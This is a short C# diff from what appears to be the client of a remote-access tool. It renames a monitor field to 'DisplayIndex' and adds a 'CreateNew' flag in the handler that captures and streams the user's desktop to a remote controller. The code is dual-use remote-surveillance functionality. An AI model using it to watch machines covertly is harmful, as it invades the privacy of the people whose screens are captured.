@@ -46,26 +46,26 @@ namespace xClient.Core.Commands
 
         public static void HandleGetDesktop(GetDesktop command, Client client)
         {
-            var monitorBounds = ScreenHelper.GetBounds((command.Monitor));
+            var monitorBounds = ScreenHelper.GetBounds((command.DisplayIndex));
             var resolution = new Resolution {Height = monitorBounds.Height, Width = monitorBounds.Width};
 
             if (StreamCodec == null)
-                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
+                StreamCodec = new UnsafeStreamCodec(command.Quality, command.DisplayIndex, resolution);
 
-            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor
+            if (command.CreateNew || StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.DisplayIndex
                 || StreamCodec.Resolution != resolution)
             {
                 if (StreamCodec != null)
                     StreamCodec.Dispose();
 
-                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
+                StreamCodec = new UnsafeStreamCodec(command.Quality, command.DisplayIndex, resolution);
             }
 
             BitmapData desktopData = null;
             Bitmap desktop = null;
             try
             {
-                desktop = ScreenHelper.CaptureScreen(command.Monitor);
+                desktop = ScreenHelper.CaptureScreen(command.DisplayIndex);
                 desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                     ImageLockMode.ReadWrite, desktop.PixelFormat);
 
